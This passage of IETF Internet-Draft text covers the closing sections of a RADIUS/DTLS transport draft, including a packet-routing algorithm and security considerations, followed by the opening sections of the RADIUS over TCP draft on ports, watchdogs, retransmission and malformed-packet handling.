   [STATUS] MUST be used as the "watchdog packet" in the watchdog
   algorithm.

   RADIUS/DTLS clients SHOULD pro-actively close sessions when they have
   been idle for a period of time.  We RECOMMEND that a session be
   closed when no traffic over than watchdog packets and (possibly)
   responses have been sent for three watchdog timeouts.  This behavior



DeKok, Alan                   Informational                    [Page 11]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


   ensures that clients do not waste resources on the server by causing
   it to track idle sessions.

   RADIUS/DTLS clients SHOULD NOT send both normal RADIUS and
   RADIUS/DTLS packets from the same source socket.  This practice
   causes increased complexity in the client application, and increases
   the potential for security breaches due to implementation issues.

   RADIUS/DTLS clients MUST NOT send both normal RADIUS and RADIUS/DTLS
   packets over the same key as defined in Section 4.1, abovre (source
   IP, source port, destination IP, destination port).  Doing so would
   require that servers perform RADIUS and RADIUS/DTLS determination for
   every packet that has been received.

   RADIUS/DTLS clients SHOULD use TLS session resumption, where
   possible.  This practice lowers the time and effort required to start
   a DTLS session with a server, and increases network responsiveness.

| 5. Processing Algorithm


   The following algorithm MUST be used by an implementation of this
   protocol.  This algorithm is used to route packets to the appropriate
   destination.  We assume the following variables:

      D - implementation-specific handle to an existing DTLS session

      P - UDP packet received from the network.  This packet MUST
          also contain information about source IP/port, and
          destination IP/port.

      R - a RADIUS packet

      T - a tracking table used to manage ongoing DTLS sessions

   We also presume the following functions or functionality exists:

      receive_packet_from_network() - a function that reads a packet
      from the network, and returns P as above.  We presume also that
      this function performs the normal RADIUS client validation, and
      does not return P if the packet is from an unknown client.

      lookup_dtls_session() - a function that takes a packet P, a table
      T, and uses P to look up the corresponding DTLS session in T.  It
      returns either a session D, or a "null" indicator that no
      corresponding session exists.

      client_supports_rdtls() - a function that takes a packet P, and
      returns a boolean value as to whether or not the client



DeKok, Alan                   Informational                    [Page 12]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


      originating the packet was marked as supporting RADIUS/DTLS.

      process_dtls_packet() - a function that takes a DTLS packet P, and
      a DTLS session D.  It performs all necessary steps to use D to
      setup a DTLS session, and to decode P (where possible) into a
      RADIUS packet.  This function is also expected to perform checks
      for TLS errors.  On any fatal errors, it closes the session, and
      deletes D from the tracking table T.  If a RADIUS packet is
      decoded from P, it is returned by the function as R, otherwise a
      "null" indicator is returned.

      process_dtls_clienthello() - a function that takes a DTLS packet
      P, and initiates a DTLS session.  If P contains a valid DTLS
      Cookie, a DTLS session D is created, and stored in the tracking
      table T.  If P does not contain a DTLS Cookie, no session is
      created, and instead a HelloVerifyRequest containing a cookie is
      sent in response.  Packets containing invalid cookies are
      discarded.

      process_radius_packet() - a function that takes a RADIUS packet P,
      and processes it using the normal RADIUS methods.

   The algorithm is as follows:

         P = receive_packet_from_network()
         D = lookup_dtls_session(T, P)

         if (D || client_supports_rdtls(P)) {
            R = process_dtls_packet(D, P)
            if (R) {
               process_radius_packet(R)
            }

         } else if (first_octet_of_packet_is_22(P)) {
            process_dtls_clienthello(P)

         } else {
            process_radius_packet(P)
         }

   For simplicity, the timers necessary to perform expiry of "old"
   sessions are not included in the above algorithm.  This algorithm may
   also need to be modified if the RADIUS/DTLS server supports client
   validation by methods other than source IP address.







DeKok, Alan                   Informational                    [Page 13]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


| 6. Diameter Considerations


   This specification is for a transport layer specific to RADIUS.  As a
   result, there are no Diameter considerations.

| 7. IANA Considerations


   This specification does not create any new registries, nor does it
   require assignment of any protocol parameters.

| 8. Security Considerations


   This entire specification is devoted to discussing security
   considerations related to RADIUS.  However, we discuss a few
   additional issues here.

   This specification relies on the existing DTLS, RADIUS, and
   RADIUS/TLS specifications.  As a result, all security considerations
   for DTLS apply to the DTLS portion of RADIUS/DTLS.  Similarly, the
   TLS and RADIUS security issues discussed in [RADIUS/TLS] also apply
   to this specification.  All of the security considerations for RADIUS
   apply to the RADIUS portion of the specification.

   However, many security considerations raised in the RADIUS documents
   are related to RADIUS encryption and authorization.  Those issues are
   largely mitigated when DTLS is used as a transport method.  The
   issues that are not mitigated by this specification are related to
   the RADIUS packet format and handling, which is unchanged in this
   specification.

   The only new portion of the specification that could have security
   implications is a servers ability to accept both RADIUS and DTLS
   packets on the same port.  The filter that disambiguates the two
   protocols is simple, and is just a check for the value of one byte.
   We do not expect this check to have any security issues.

   We also note that nothing prevents malicious clients from sending
   DTLS packets to existing RADIUS implementations, or RADIUS packets to
   existing DTLS implementations.  There should therefore be no issue
   with clients sending RADIUS/DTLS packets to legacy servers that do
   not support the protocol.

| 8.1. Legacy RADIUS Security


   We reiterate here the poor security of the legacy RADIUS protocol.
   We RECOMMEND that all RADIUS clients and servers implement this
   specification as soon as possible.  New attacks on MD5 have appeared
   over the past few years, and there is a distinct possibility that MD5



DeKok, Alan                   Informational                    [Page 14]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


   may be completely broken in the near future.

   The existence of fast and cheap attacks on MD5 could result in a loss
   of all network security that depends on RADIUS.  Attackers could
   obtain user passwords, and possibly gain complete network access.  It
   is difficult to overstate the disastrous consequences of a successful
   attack on RADIUS.

   We also caution implementors (especially client implementors) about
   using RADIUS/DTLS.  It may be tempting to use the shared secret as
   the basis for a TLS pre-shared key (PSK) method, and to leave the
   user interface otherwise unchanged.  This practice MUST NOT be used.
   The administrator MUST be given the option to use DTLS.  Any shared
   secret used for RADIUS MUST NOT be used for DTLS.  Re-using a shared
   secret between RADIUS and DTLS would negate all of the benefits found
   by using DTLS.

   When using PSK methods, RADIUS/DTLS clients MUST support keys (i.e.
   shared secrets) that are at least 32 characters in length.

   RADIUS/DTLS client implementors MUST expose a configuration that
   allows the administrator to choose the cipher suite.  RADIUS/DTLS
   client implementors SHOULD expose a configuration that allows an
   administrator to configure all certificates necessary for
   certificate-based authentication.  These certificates include client,
   server, and root certificates.

   When using PSK methods, RADIUS/DTLS servers MUST support keys (i.e.
   shared secrets) that are at least 32 characters in length.
   RADIUS/DTLS server administrators MUST use strong shared secrets for
   those PSK methods.  We RECOMMEND using keys derived from a
   cryptographically secure pseudo-random number generator (CSPRNG).
   For example, a reasonable key may be 32 characters of a SHA-256 hash
   of at least 64 bytes of data taken from a CSPRNG.  If this method
   seems too complicated, a certificate-based TLS method SHOULD be used
   instead.

   The previous RADIUS practice of using shared secrets that are minor
   variations of words is NOT RECOMMENDED, as it would negate nearly all
   of the security of DTLS.

| 9. References


| 9.1. Normative references


[RFC2865]
     Rigney, C., Willens, S., Rubens, A. and W. Simpson, "Remote
     Authentication Dial In User Service (RADIUS)", RFC 2865, June 2000.



DeKok, Alan                   Informational                    [Page 15]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


[RFC3539]
     Aboba, B. et al., "Authentication, Authorization and Accounting
     (AAA) Transport Profile", RFC 3539, June 2003.

[RFC4347]
     Rescorla E., and Modadugu, N., "Datagram Transport Layer Security",
     RFC 4347, April 2006.

[RFC5246]
     Dierks, T. and E. Rescorla, "The Transport Layer Security (TLS)
     Protocol Version 1.2", RFC 5246, August 2008.

[RADIUS/TLS]
     Winter. S, et. al., "TLS encryption for RADIUS over TCP", draft-
     ietf-radext-radsec-06.txt, March 2010 (work in progress)

[STATUS]
     DeKok, A., "Use of Status-Server Packets in the Remote
     Authentication Dial In User Service (RADIUS) Protocol", draft-ietf-
     radext-status-server-09.txt, May 2010 (work in progress).

| 9.2. Informative references


[RFC1321]
     Rivest, R. and S. Dusse, "The MD5 Message-Digest Algorithm", RFC
     1321, April 1992.

[RFC2119]
     Bradner, S., "Key words for use in RFCs to Indicate Requirement
     Levels", RFC 2119, March, 1997.

[RFC2866]
     Rigney, C., "RADIUS Accounting", RFC 2866, June 2000.

[RFC5080]
     Nelson, D. and DeKok, A, "Common Remote Authentication Dial In User
     Service (RADIUS) Implementation Issues and Suggested Fixes", RFC
     5080, December 2007.

[RFC5176]
     Chiba, M. et al., "Dynamic Authorization Extensions to Remote
     Authentication Dial In User Service (RADIUS)", RFC 5176, January
     2008.

[MD5Attack]
     Dobbertin, H., "The Status of MD5 After a Recent Attack",
     CryptoBytes Vol.2 No.2, Summer 1996.




DeKok, Alan                   Informational                    [Page 16]

 
INTERNET-DRAFT    DTLS as a Transport Layer for RADIUS      26 July 2010


[MD5Break]
     Wang, Xiaoyun and Yu, Hongbo, "How to Break MD5 and Other Hash
     Functions", EUROCRYPT. ISBN 3-540-25910-4, 2005.

Acknowledgments

   Parts of the text in Section 3 defining the Request and Response
   Authenticators were taken with minor edits from [RFC2865] Section 3.

   The author would like to thank Mike McCauley of Open Systems
   Consultants for making a Radiator server available for inter-
   operability testing.

Authors' Addresses

   Alan DeKok
   The FreeRADIUS Server Project
   http://freeradius.org

   Email: aland@freeradius.org































DeKok, Alan                   Informational                    [Page 17]


Html markup produced by rfcmarkup 1.101, available from http://tools.ietf.org/tools/rfcmarkup/ 

			8.3.1.2 RADIUS/TCP

				8.3.1.2.1 http://tools.ietf.org/html/draft-ietf-radext-tcp-transport-09

[Docs] [txt|pdf] [Tracker] [WG] [Email] [Diff1] [Diff2] [Nits]

Versions: (draft-dekok-radext-tcp-transport) 00 01 02 03 04 05 06 07 08 09 RFC 6613

Network Working Group                                           A. DeKok
INTERNET-DRAFT                                                FreeRADIUS
Category: Experimental
<draft-ietf-radext-tcp-transport-09.txt>
Expires: April 12, 2011
12 October 2010



                            
RADIUS Over TCP

                   
draft-ietf-radext-tcp-transport-09


Abstract

   The Remote Authentication Dial In User Server (RADIUS) Protocol has
   until now required the User Datagram Protocol (UDP) as the underlying
   transport layer.  This document defines RADIUS over the Transmission
   Control Protocol (RADIUS/TCP), in order to address handling issues
   related to RADIUS over Transport Layer Security (RADIUS/TLS).  It
   permits TCP to be used as a transport protocol for RADIUS only when a
   transport layer such as TLS or IPsec provides confidentialy and
   security.

   Status of this Memo

      This Internet-Draft is submitted to IETF in full conformance with
      the provisions of BCP 78 and BCP 79.

      Internet-Drafts are working documents of the Internet Engineering
      Task Force (IETF), its areas, and its working groups.  Note that
      other groups may also distribute working documents as Internet-
      Drafts.

      Internet-Drafts are draft documents valid for a maximum of six
      months and may be updated, replaced, or obsoleted by other
      documents at any time.  It is inappropriate to use Internet-Drafts
      as reference material or to cite them other than as "work in
      progress."

      The list of current Internet-Drafts can be accessed at
      http://www.ietf.org/ietf/1id-abstracts.txt.

      The list of Internet-Draft Shadow Directories can be accessed at
      http://www.ietf.org/shadow.html.

      This Internet-Draft will expire on April 12, 2011

   Copyright Notice




DeKok, Alan                   Experimental                      [Page 1]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


      Copyright (c) 2010 IETF Trust and the persons identified as the
      document authors.  All rights reserved.

      This document is subject to BCP 78 and the IETF Trust's Legal
      Provisions Relating to IETF Documents
      (http://trustee.ietf.org/license-info/) in effect on the date of
      publication of this document.  Please review these documents
      carefully, as they describe your rights and restrictions with
      respect to this document.  Code Components extracted from this
      document must include Simplified BSD License text as described in
      Section 4.e of the Trust Legal Provisions and are provided without
      warranty as described in the Simplified BSD License.







































DeKok, Alan                   Experimental                      [Page 2]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   Table of Contents

|| 1.  Introduction .............................................    4
|   1.1.  Applicability of Reliable Transport .................    5
|   1.2.  Terminology .........................................    6
|   1.3.  Requirements Language ...............................    7
|| 2.  Changes to RADIUS ........................................    7
|   2.1.  Packet Format .......................................    8
|   2.2.  Assigned Ports for RADIUS/TCP .......................    8
|   2.3.  Management Information Base (MIB) ...................    9
|   2.4.  Detecting Live Servers ..............................    9
|   2.5.  Congestion Control Issues ...........................   10
|   2.6.  TCP Specific Issues .................................   10
|      2.6.1.  Duplicates and Retransmissions .................   11
|      2.6.2.  Head of Line Blocking ..........................   12
|      2.6.3.  Shared Secrets .................................   12
|      2.6.4.  Malformed Packets and Unknown Clients ..........   12
|      2.6.5.  Limitations of the ID Field ....................   13
|      2.6.6.  EAP Sessions ...................................   14
|      2.6.7.  TCP Applications are not UDP Applications ......   15
|| 3.  Diameter Considerations ..................................   15
|| 4.  IANA Considerations ......................................   15
|| 5.  Security Considerations ..................................   15
|| 6.  References ...............................................   16
|   6.1.  Normative References ................................   16
|   6.2.  Informative References ..............................   16

























DeKok, Alan                   Experimental                      [Page 3]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


| 1. Introduction


   The RADIUS Protocol is defined in [RFC2865] as using the User
   Datagram Protocol (UDP) for the underlying transport layer.  While
   there are a number of benefits to using UDP as outlined in [RFC2865]
   Section 2.4, there are also some limitations:

      * Unreliable transport.  As a result, systems using RADIUS have to
      implement application-layer timers and re-transmissions, as
      described in [RFC5080] Section 2.2.1.

      * Packet fragmentation.  [RFC2865] Section 3 permits RADIUS
      packets up to 4096 octets in length.  These packets are larger
      than the common Internet MTU (576), resulting in fragmentation of
      the packets at the IP layer when they are proxied over the
      Internet.  Transport of fragmented UDP packets appears to be a
      poorly tested code path on network devices.  Some devices appear
      to be incapable of transporting fragmented UDP packets, making it
      difficult to deploy RADIUS in a network where those devices are
      deployed.

      * Connectionless transport.  Neither clients nor servers receive
      positive statements that a "connection" is down.  This information
      has to be deduced instead from the absence of a reply to a
      request.

      * Lack of congestion control.  Clients can send arbitrary amounts
      of traffic with little or no feedback.  This lack of feedback can
      result in congestive collapse of the network.

   RADIUS has been widely deployed for well over a decade, and continues
   to be widely deployed.  Experience shows that these issues have been
   minor in some use-cases, and problematic in others.  For use-cases
   such as inter-server proxying, an alternative transport and security
   model -- RADIUS/TLS, as defined in [RADIUS/TLS].  That document
   describes the transport implications of running RADIUS/TLS.

   The choice of TCP as a transport protocol is largely driven by the
   desire to improve the security of RADIUS by using RADIUS/TLS.  For
   practical reasons, the transport protocol (TCP) is defined separately
   from the security mechanism (TLS).

   Since "bare" TCP does not provide for confidentiality or enable
   negotiation of credible ciphersuites, its use is not appropriate for
   inter-server communications where strong security is required.  As a
   result "bare" TCP transport MUST NOT be used without TLS, IPsec, or
   other secure upper layer.




DeKok, Alan                   Experimental                      [Page 4]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   "Bare" TCP transport MAY, however, be used when another method such
   as IPSec [RFC4301] is used to provide additional confidentiality and
   security.  Should experience show that such deployments are useful,
   this specification could be moved to standards track.

| 1.1. Applicability of Reliable Transport


   The intent of this document is to address transport issues related to
   RADIUS/TLS [RADIUS/TLS] in inter-server communications scenarios,
   such as inter-domain communication between proxies.  These situations
   benefit from the confidentiality and ciphersuite negotiation that can
   be provided by TLS. Since TLS is already widely available within the
   operating systems used by proxies, implementation barriers are low.

   In scenarios where RADIUS proxies exchange a large volume of packets,
   it is likely that there will be sufficient traffic to enable the
   congestion window to be widened beyond the minimum value on a long-
   term basis, enabling ACK piggy-backing.  Through use of an
   application-layer watchdog as described in [RFC3539], it is possible
   to address the objections to reliable transport described in
   [RFC2865] Section 2.4 without substantial watchdog traffic, since
   regular traffic is expected in both directions.

   In addition, use of RADIUS/TLS has been found to improve operational
   performance when used with multi-round trip authentication mechanisms
   such as EAP over RADIUS  [RFC3579].  In such exchanges, it is typical
   for EAP fragmentation to increase the number of round-trips required.
   For example, where EAP-TLS authentication [RFC5216] is attempted and
   both the EAP peer and server utilize certificate chains of 8KB, as
   many as 15 round-trips can be required if RADIUS packets are
   restricted to the common Ethernet MTU (1500 octets) for EAP over LAN
   (EAPoL) use-cases.  Fragmentation of RADIUS/UDP packets is generally
   inadvisable due to lack of fragmentation support within intermediate
   devices such as filtering routers, firewalls and NATs.  However,
   since RADIUS/UDP implementations typically do not support MTU
   discovery, fragmentation can occur even when the maximum RADIUS/UDP
   packet size is restricted to 1500 octets.

   These problems disappear if a 4096 application-layer payload can be
   used alongside RADIUS/TLS.  Since most TCP implementations support
   MTU discovery, the TCP MSS is automatically adjusted to account for
   the MTU, and the larger congestion window supported by TCP may allow
   multiple TCP segments to be sent within a single window.  Even those
   few TCP stacks which do not perform path MTU discovery can already
   support arbitrary payloads.

   Where the MTU for EAP packets is large, RADIUS/EAP traffic required
   for an EAP-TLS authentication with 8KB certificate chains may be



DeKok, Alan                   Experimental                      [Page 5]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   reduced to 7 round-trips or less, resulting in substantially reduced
   authentication times.

   In addition, experience indicates that EAP sessions transported over
   RADIUS/TLS are less likely to abort unsuccessfully.  Historically,
   RADIUS over UDP implementations have exhibited poor retransmission
   behavior.  Some implementations retransmit packets, others do not,
   and others send new packets rather then performing retransmission.
   Some implementations are incapable of detecting EAP retransmissions,
   and will instead treat the retransmitted packet as an error.  As a
   result, within RADIUS/UDP implementations, retransmissions have a
   high likeilhood of causing an EAP authentication session to fail.
   For a system with a million logins a day running EAP-TLS mutual
   authentication with 15 round-trips, and having a packet loss
   probability of P=0.01%, we expect that 0.3% of connections will
   experience at least one lost packet.  That is, 3,000 user sessions
   each day will experience authentication failure.  This is an
   unacceptable failure rate for a mass-market network service.

   Using a reliable transport method such as TCP means that RADIUS
   implementations can remove all application-layer retransmissions, and
   instead rely on the Operating System (OS) kernel's well-tested TCP
   transport to ensure Path MTU discovery and reliable delivery.  Modern
   TCP implementations also implement anti-spoofing provisions, which is
   more difficult to do in a UDP application.

   In contrast, use of TCP as a transport between a NAS and a RADIUS
   server is usually a poor fit.  As noted in [RFC3539] Section 2.1, for
   systems originating low numbers of RADIUS request packets, inter-
   packet spacing is often larger than the packet RTT, meaning that, the
   congestion window will typically stay below the minimum value on a
   long-term basis. The result is an increase in packets due to ACKs as
   compared to UDP, without a corresponding set of benefits.  In
   addition, the lack of substantial traffic implies the need for
   additional watchdog traffic to confirm reachability.

   As a result, the objections to reliable transport indicated in
   [RFC2865] Section 2.4 continue to apply to NAS-RADIUS server
   communications and UDP SHOULD continue to be used as the transport
   protocol in this scenario.  In addition, it is recommended that
   implementations of "RADIUS Dynamic AUthorization Extensions"
   [RFC5176] SHOULD continue to utilize UDP transport, since the volume
   of dynamic authorization traffic is usually expected to be small.

| 1.2. Terminology


   This document uses the following terms:




DeKok, Alan                   Experimental                      [Page 6]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


RADIUS client
     A device that provides an access service for a user to a network.
     Also referred to as a Network Access Server, or NAS.

RADIUS server
     A device that provides one or more of authentication,
     authorization, and/or accounting (AAA) services to a NAS.

RADIUS proxy
     A RADIUS proxy acts as a RADIUS server to the NAS, and a RADIUS
     client to the RADIUS server.

RADIUS request packet
     A packet originated by a RADIUS client to a RADIUS server.  e.g.
     Access-Request, Accounting-Request, CoA-Request, or Disconnect-
     Request.

RADIUS response packet
     A packet sent by a RADIUS server to a RADIUS client, in response to
     a RADIUS request packet.  e.g. Access-Accept, Access-Reject,
     Access-Challenge, Accounting-Response, CoA-ACK, etc.

RADIUS/UDP
     RADIUS over UDP, as defined in [RFC2865].

RADIUS/TCP
     RADIUS over TCP, as defined in this document.

RADIUS/TLS
     RADIUS over TLS, as defined in [RADIUS/TLS].

| 1.3. Requirements Language


   The key words "MUST", "MUST NOT", "REQUIRED", "SHALL", "SHALL NOT",
   "SHOULD", "SHOULD NOT", "RECOMMENDED", "MAY", and "OPTIONAL" in this
   document are to be interpreted as described in [RFC2119].

| 2. Changes to RADIUS


   RADIUS/TCP involves sending RADIUS application messages over a TCP
   connection.  In the sections that follow, we discuss the implications
   for the RADIUS packet format (Section 2.1), port usage (Section 2.2),
   RADIUS MIBs (Section 2.3) and RADIUS proxies (Section 2.5).  TCP-
   specific issues are discussed in Section 2.6.







DeKok, Alan                   Experimental                      [Page 7]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


| 2.1. Packet Format


   The RADIUS packet format is unchanged from [RFC2865], [RFC2866], and
   [RFC5176].  Specifically, all of the following portions of RADIUS
   MUST be unchanged when using RADIUS/TCP:

      * Packet format
      * Permitted codes
      * Request Authenticator calculation
      * Response Authenticator calculation
      * Minimum packet length
      * Maximum packet length
      * Attribute format
      * Vendor-Specific Attribute (VSA) format
      * Permitted data types
      * Calculations of dynamic attributes such as CHAP-Challenge,
        or Message-Authenticator.
      * Calculation of "encrypted" attributes such as Tunnel-Password.

   The use of TLS transport does not change the calculation of security-
   related fields (such as the Response-Authenticator) in RADIUS
   [RFC2865] or RADIUS Dynamic Authorization [RFC5176].  Calculation of
   attributes such as User-Password [RFC2865] or Message-Authenticator
   [RFC3579] also does not change.

   Clients and servers MUST be able to store and manage shared secrets
   based on the key described above, of (IP address, port, transport
   protocol).

   The changes to RADIUS implementations required to implement this
   specification are largely limited to the portions that send and
   receive packets on the network.

| 2.2. Assigned Ports for RADIUS/TCP


   IANA has already assigned TCP ports for RADIUS transport, as outlined
   below:

      * radius          1812/tcp
      * radius-acct     1813/tcp
      * radius-dynauth  3799/tcp

   Since these ports are unused by existing RADIUS implementations, the
   assigned values MUST be used as the default ports for RADIUS over
   TCP.

   The early deployment of RADIUS was done using UDP port number 1645,
   which conflicts with the "datametrics" service.  Implementations



DeKok, Alan                   Experimental                      [Page 8]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   using RADIUS/TCP MUST NOT use TCP ports 1645 or 1646 as the default
   ports for this specification.

   The "radsec" port (2083/tcp) SHOULD be used as the default port for
   RADIUS/TLS.  The "radius" port (1812/tcp) SHOULD NOT be used for
   RADIUS/TLS.

| 2.3. Management Information Base (MIB)


   The MIB Module definitions in [RFC4668], [RFC4669], [RFC4670],
   [RFC4671], [RFC4672], and [RFC4673] are intended to be used for
   RADIUS over UDP.  As such, they do not support RADIUS/TCP, and will
   need to be updated in the future.  Implementations of RADIUS/TCP
   SHOULD NOT re-use these MIB Modules to perform statistics counting
   for RADIUS/TCP connections.

| 2.4. Detecting Live Servers


   As RADIUS is a "hop by hop" protocol, a RADIUS proxy shields the
   client from any information about downstream servers.  While the
   client may be able to deduce the operational state of the local
   server (i.e. proxy), it cannot make any determination about the
   operational state of the downstream servers.

   Within RADIUS as defined in [RFC2865], proxies typically only forward
   traffic between the NAS and RADIUS server, and do not generate their
   own responses.  As a result, when a NAS does not receive a response
   to a request, this could be the result of packet loss between the NAS
   and proxy, a problem on the proxy, loss between the RADIUS proxy and
   server, or a problem with the server.

   When UDP is used as a transport protocol, the absence of a reply can
   cause a client to deduce (incorrectly) that the proxy is unavailable.
   The client could then fail over to another server, or conclude that
   no "live" servers are available (OKAY state in [RFC3539] Appendix A).
   This situation is made even worse when requests are sent through a
   proxy to multiple destinations.  Failures in one destination may
   result in service outages for other destinations, if the client
   erroneously believes that the proxy is unresponsive.

   For RADIUS/TLS, it is RECOMMENDED that implementations utilize the
   existence of a TCP connection along with the application layer
   watchdog defined in [RFC3539] Section 3.4 to determine that the
   server is "live".

   RADIUS clients using RADIUS/TCP MUST mark a connection DOWN if the
   network stack indicates that the connection is no longer active.  If
   the network stack indicates that connection is still active, Clients



DeKok, Alan                   Experimental                      [Page 9]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   MUST NOT decide that it is down until the application layer watchdog
   algorithm has marked it DOWN ([RFC3539] Appendix A).  RADIUS clients
   using RADIUS/TCP MUST NOT decide that a RADIUS server is unresponsive
   until all TCP connections to it have been marked DOWN.

   The above requirements do not forbid the practice of a client pro-
   actively closing connections, or marking a server as DOWN due to an
   administrative decision.

| 2.5. Congestion Control Issues


   Additional issues with RADIUS proxies involve transport protocol
   changes where the proxy receives packets on one transport protocol,
   and forwards them on a different transport protocol.  There are
   several situations in which the law of "conservation of packets"
   could be violated on an end-to-end basis (e.g. where more packets
   could enter the system than could leave it on a short-term basis):

      * Where TCP is used between proxies, it is possible that the
      bandwidth consumed by incoming UDP packets destined to a given
      upstream server could exceed the sending rate of a single TCP
      connection to that server, based on the window size/RTT estimate.

      * It is possible for the incoming rate of TCP packets destined to
      a given realm to exceed the UDP throughput achievable using the
      transport guidelines established in [RFC5080].  This could happen,
      for example, where the TCP window between proxies has opened, but
      packet loss is being experienced on the UDP leg, so that the
      effective congestion window on the UDP side is 1.

   Intrinsically, proxy systems operate with multiple control loops
   instead of one end-to-end loop, and so are less stable.  This is true
   even for TCP-TCP proxies.  As discussed in [RFC3539], the only way to
   achieve stability equivalent to a single TCP connection is to mimic
   the end-to-end behavior of a single TCP connection.  This typically
   is not achievable with an application-layer RADIUS implementation,
   regardless of transport.

| 2.6. TCP Specific Issues


   The guidelines defined in [RFC3539] for implementing a AAA protocol
   over reliable transport are applicable to RADIUS/TLS.

   The Application Layer Watchdog defined in [RFC3539] Section 3.4 MUST
   be used.  The Status-Server packet [RFC5997] MUST be used as the
   application layer watchdog message.  Implementations MUST reserve one
   RADIUS ID per connection for the application layer watchdog message.
   This restriction is described further below in Section 2.6.4.



DeKok, Alan                   Experimental                     [Page 10]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   RADIUS/TLS Implementations MUST support receiving RADIUS packets over
   both UDP and TLS transports originating from the same endpoint.
   RADIUS packets received over UDP MUST be replied to over UDP; RADIUS
   packets received over TLS MUST be replied to over TLS.  That is,
   RADIUS clients and servers MUST be treated as unique based on a key
   of the three-tuple (IP address, port, transport protocol).
   Implementations MUST permit different shared secrets to be used for
   UDP and TCP connections to the same destination IP address and
   numerical port.

   This requirement does not forbid the traditional practice of using
   primary and secondary servers in a fail-over relationship.  Instead,
   it requires that two services sharing an IP address and numerical
   port, but differing in transport protocol, MUST be treated as
   independent services for the purpose of fail-over, load-balancing,
   etc.

   Whenever the underlying network stack permits the use of TCP
   keepalive socket options, their use is RECOMMENDED.

| 2.6.1. Duplicates and Retransmissions


   As TCP is a reliable transport, implementations MUST NOT retransmit
   RADIUS request packets over a given TCP connection.  Similarly, if
   there is no response to a RADIUS packet over one TCP connection,
   implementations MUST NOT retransmit that packet over a different TCP
   connection to the same destination IP address and port, while the
   first connection is in the OKAY state ([RFC3539] Appendix A).

   However, if the TCP connection is broken or closed, retransmissions
   over new connections are permissible.  RADIUS request packets that
   have not yet received a response MAY be transmitted by a RADIUS
   client over a new TCP connection.  As this procedure involves using a
   new source port, the ID of the packet MAY change.  If the ID changes,
   any security attributes such as Message-Authenticator MUST be
   recalculated.

   If a TCP connection is broken or closed, any cached RADIUS response
   packets ([RFC5080] Section 2.2.2) associated with that connection
   MUST be discarded.  A RADIUS server SHOULD stop processing of any
   requests associated with that TCP connection.  No response to these
   requests can be sent over the TCP connection, so any further
   processing is pointless.  This requirement applies not only to RADIUS
   servers, but also to proxies.  When a client's connection to a proxy
   server is closed, there may be responses from a home server that were
   supposed to be sent by the proxy back over that connection to the
   client.  Since the client connection is closed, those responses from
   the home server to the proxy server SHOULD be silently discarded by



DeKok, Alan                   Experimental                     [Page 11]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   the proxy.

   Despite the above discussion, RADIUS servers SHOULD still perform
   duplicate detection on received packets, as described in [RFC5080]
   Section 2.2.2.  This detection can prevent duplicate processing of
   packets from non-conformant clients.

   RADIUS packets SHOULD NOT be re-transmitted to the same destination
   IP and numerical port, but over a different transport protocol.
   There is no guarantee in RADIUS that the two ports are in any way
   related.  This requirement does not, however, forbid the practice of
   putting multiple servers into a fail-over or load-balancing pool.  In
   that situation, RADIUS request MAY be retransmitted to another server
   that is known to be part of the same pool.

| 2.6.2. Head of Line Blocking


   When using UDP as a transport for RADIUS, there is no ordering of
   packets.  If a packet sent by a client is lost, that loss has no
   effect on subsequent packets sent by that client.

   Unlike UDP, TCP is subject to issues related to Head of Line (HoL)
   blocking.  This occurs when when a TCP segment is lost and a
   subsequent TCP segment arrives out of order.  While the RADIUS server
   can process RADIUS packets out of order, the semantics of TCP makes
   this impossible.  This limitation can lower the maximum packet
   processing rate of RADIUS/TCP.

| 2.6.3. Shared Secrets


   The use of TLS transport does not change the calculation of security-
   related fields (such as the Response-Authenticator) in RADIUS
   [RFC2865] or RADIUS Dynamic Authorization [RFC5176].  Calculation of
   attributes such as User-Password [RFC2865] or Message-Authenticator
   [RFC3579] also does not change.

   Clients and servers MUST be able to store and manage shared secrets
   based on the key described above, of (IP address, port, transport
   protocol).

| 2.6.4. Malformed Packets and Unknown Clients


   The RADIUS specifications ([RFC2865], etc.) say that an
   implementation should "silently discard" a packet in a number of
   circumstances.  This action has no further consequences for UDP
   transport, as the "next" packet is completely independent of the
   previous one.




DeKok, Alan                   Experimental                     [Page 12]

 
INTERNET-DRAFT               RADIUS Over TCP             12 October 2010


   When TCP is used as a transport, decoding the "next" packet on a
   connection depends on the proper decoding of the previous packet.  As
   a result, the behavior with respect to discarded packets has to
   change.

   Implementations of this specification SHOULD treat the "silently
   discard" texts referenced above as "silently discard and close the
   connection."  That is, the TCP connection MUST be closed if any of
   the following circumstances are seen:

      * Connection from an unknown client
      * Packet where the RADIUS "length" field is less than the minimum
        RADIUS packet length
      * Packet where the RADIUS "length" field is more than the maximum
        RADIUS packet length
      * Packet that has an Attribute "length" field has value of zero
        or one (0 or 1).
      * Packet where the attributes do not exactly fill the packet
      * Packet where the Request Authenticator fails validation
        (where validation is required).
      * Packet where the Response Authenticator fails validation
        (where validation is required).
      * Packet where the Message-Authenticator attribute fails
        validation (when it occurs in a packet).

   After applying the above rules, there are still two situations where
   the previous specifications allow a packet to be "silently discarded"
   on reception:

      * Packets with an invalid code field
      * Response packets that do not match any outstanding request

   In these situations, the TCP connections MAY remain open, or MAY be
   closed, as an implementation choice.  However, the invalid packet
   MUST be silently discarded.

   These requirements reduce the possibility for a misbehaving client or
   server to wreak havoc on the network.

| 2.6.5. Limitations of the ID Field


   The RADIUS ID field is one octet in size.  As a result, any one TCP
   connection can have only 256 "in flight" RADIUS packets at a time.
   If more than 256 simultaneous "in flight" packets are required,
   additional TCP connections will need to be opened.  This limitation
   is also noted in [RFC3539] Section 2.4.

